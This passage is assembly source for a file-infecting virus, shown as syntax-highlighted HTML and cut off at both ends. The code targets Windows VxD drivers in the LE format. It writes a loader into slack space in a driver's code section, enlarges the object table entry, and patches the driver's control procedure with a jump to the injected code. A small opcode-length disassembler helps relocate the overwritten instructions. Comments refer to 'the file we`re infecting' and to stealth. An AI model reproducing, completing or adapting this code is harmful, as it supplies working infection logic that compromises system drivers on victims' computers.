                        </span><span class="sc1">; to restore normal execution in VxD</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sect_offs</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">our_offs</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">save_0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">save_2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">save_4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cp</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ddb.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">save_1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">save_3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">our_offs</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">save_5</span><span class="sc4">-</span><span class="sc5">ldr_start</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cp_offs</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">save_5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">our_offs</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ldr_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ldr_start</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cp_offs</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

                        </span><span class="sc1">; jmp to our code</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">cp</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">cp</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; well, thats all - control_x_patches,</span><span class="sc0">
                        </span><span class="sc1">; "save_x"-values calculated</span><span class="sc0">

</span><span class="sc1">;                       mov     ax, 4202h       ; seek end-of-file</span><span class="sc0">
</span><span class="sc1">;                       mov     bx, handle</span><span class="sc0">
</span><span class="sc1">;                       xor     cx, cx</span><span class="sc0">
</span><span class="sc1">;                       cwd</span><span class="sc0">
</span><span class="sc1">;                       int     21h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       ; store file position</span><span class="sc0">
</span><span class="sc1">;                       mov     vxd_pos.word ptr 2, dx</span><span class="sc0">
</span><span class="sc1">;                       mov     vxd_pos.word ptr 0, ax</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       mov     ah, 40h         ; write main code</span><span class="sc0">
</span><span class="sc1">;                       lea     dx, vxd_start</span><span class="sc0">
</span><span class="sc1">;                       mov     cx, vxd_size</span><span class="sc0">
</span><span class="sc1">;                       int     21h</span><span class="sc0">

                        </span><span class="sc1">; seek file (free space in code section)</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">our_offs</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx</span><span class="sc0">

                        </span><span class="sc1">; write our code</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ldr_start</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ldr_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writefile</span><span class="sc0">

                        </span><span class="sc1">; seek OBJECT TABLE</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_object_table_offset</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx_mz</span><span class="sc0">

                        </span><span class="sc1">; write OBJECT TABLE</span><span class="sc0">
                        </span><span class="sc1">; - only one change made, physical section size</span><span class="sc0">
                        </span><span class="sc1">;   increased by loader size</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ot</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">le_object_table_entries</span><span class="sc0">
                        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">oe_struc</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writefile</span><span class="sc0">

                        </span><span class="sc1">; seek control_proc_X</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cp_offs</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seek_edx</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cp</span><span class="sc0">          </span><span class="sc1">; write control_proc_X</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">max_cp_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">writefile</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'O'</span><span class="sc0">         </span><span class="sc1">; success</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">29h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">29h</span><span class="sc0">

</span><span class="sc5">__close</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">         </span><span class="sc1">; close file</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">__exit</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c00h</span><span class="sc0">       </span><span class="sc1">; exit to DOS</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


                        </span><span class="sc1">; this is small disassembler</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">; input:</span><span class="sc0">
                        </span><span class="sc1">;   al=opcode (byte ptr 0)</span><span class="sc0">
                        </span><span class="sc1">;   ah=opcode (byte ptr 1)</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">
                        </span><span class="sc1">; output:</span><span class="sc0">
                        </span><span class="sc1">;   CF=0:  success</span><span class="sc0">
                        </span><span class="sc1">;            cx = command size</span><span class="sc0">
                        </span><span class="sc1">;            dx:</span><span class="sc0">
                        </span><span class="sc1">;              0  normal command</span><span class="sc0">
                        </span><span class="sc1">;              1  command may contain fixups</span><span class="sc0">
                        </span><span class="sc1">;   CF=1:  error</span><span class="sc0">
                        </span><span class="sc1">;            cx/dx modified</span><span class="sc0">
                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">get_cmd_size</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; jcc xx</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0h</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rt</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E883h</span><span class="sc0">      </span><span class="sc1">; sub eax, xx</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rt</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F883h</span><span class="sc0">      </span><span class="sc1">; cmp eax, xx</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rt</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0FFh</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0800Fh</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rt</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">

                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005F6h</span><span class="sc0">  </span><span class="sc1">; test byte ptr [yyyyyyyy], xx</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__rt</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'X'</span><span class="sc0">     </span><span class="sc1">; unknown command</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">29h</span><span class="sc0">

                        </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__rt</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">clc</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">readfile</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">; readfile</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">writefile</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">; writefile</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">seek_edx_mz</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mz_neptr</span><span class="sc0">   </span><span class="sc1">; seek(edx). newexe-based</span><span class="sc0">

</span><span class="sc5">seek_edx</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">pusha</span><span class="sc0">                   </span><span class="sc1">; seek(edx)</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; file we`re infecting</span><span class="sc0">

</span><span class="sc5">handle</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; current file handle</span><span class="sc0">

</span><span class="sc5">sect_offs</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; offset of our section     [ABSOLUTE]</span><span class="sc0">

                        </span><span class="sc1">; following 2 dwords</span><span class="sc0">
                        </span><span class="sc1">; are useful for STEALTH technology</span><span class="sc0">

</span><span class="sc5">cp_offs</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; offset of control_proc_x  [ABSOLUTE]</span><span class="sc0">
</span><span class="sc5">our_offs</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; offset of our code        [ABSOLUTE]</span><span class="sc0">

</span><span class="sc5">mz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">mz_mz</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_last512</span><span class="sc0">              </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_num512</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_relnum</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_headersize</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_minmem</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_maxmem</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_ss</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_sp</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_checksum</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_ip</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_cs</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_relofs</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_ovrnum</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_reserved</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">mz_neptr</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mz_size</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">mz</span><span class="sc0">

</span><span class="sc5">le_header</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">le_magic</span><span class="sc0">                                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_byte_order</span><span class="sc0">                           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_word_order</span><span class="sc0">                           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_exec_format_level</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_cpu_type</span><span class="sc0">                             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_target_os</span><span class="sc0">                            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_module_version</span><span class="sc0">                       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_module_type_flags</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_number_of_memory_pages</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_initial_cs</span><span class="sc0">                           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_initial_eip</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_initial_ss</span><span class="sc0">                           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_initial_esp</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_memory_page_size</span><span class="sc0">                     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_bytes_on_last_page</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_fixup_section_size</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_fixup_section_checksum</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_loader_section_size</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_loader_section_checksum</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_object_table_offset</span><span class="sc0">                  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_object_table_entries</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_object_page_map_table_offset</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_object_iterate_data_map_offset</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_resource_table_offset</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_resource_table_entries</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_resident_names_table_offset</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_entry_table_offset</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_module_directives_table_offset</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_module_directives_table_entries</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_fixup_page_table_offset</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_fixup_record_table_offset</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_imported_module_names_table_offset</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_imported_modules_count</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_imported_procedure_name_table_offset</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_per_page_checksum_table_offset</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_data_pages_offset</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_preload_page_count</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_nonresident_names_table_offset</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_nonresident_names_table_length</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_nonresident_names_table_checksum</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_automatic_data_object</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_debug_information_offset</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_debug_information_length</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_preload_instance_pages_number</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_demand_instance_pages_number</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_extra_heap_allocation</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_unknown</span><span class="sc0">                              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">le_size</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">le_header</span><span class="sc0">

                        </span><span class="sc1">; vxd`s object table object entry structure</span><span class="sc0">

</span><span class="sc5">oe_struc</span><span class="sc0">                </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">oe_virtual_segment_size</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
